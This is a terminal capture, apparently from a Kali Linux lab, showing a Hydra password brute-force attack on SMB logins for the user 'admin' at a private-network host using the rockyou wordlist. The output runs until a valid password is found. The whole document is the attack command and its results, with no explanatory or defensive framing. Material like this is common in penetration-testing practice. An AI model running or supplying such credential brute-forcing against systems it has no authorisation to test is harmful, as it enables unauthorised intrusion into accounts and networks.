
```Shell

┌──(qhuser㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.137.94 smb -f 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-15 09:06:52
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.168.137.94:445/
[STATUS] 5708.00 tries/min, 5708 tries in 00:01h, 14338691 to do in 41:53h, 1 active
[STATUS] 5722.00 tries/min, 17166 tries in 00:03h, 14327233 to do in 41:44h, 1 active
[STATUS] 5737.71 tries/min, 40164 tries in 00:07h, 14304235 to do in 41:34h, 1 active
[STATUS] 5747.00 tries/min, 86205 tries in 00:15h, 14258194 to do in 41:21h, 1 active
[445][smb] host: 192.168.137.94   login: admin   password: kali
[STATUS] attack finished for 192.168.137.94 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-15 09:27:18

```
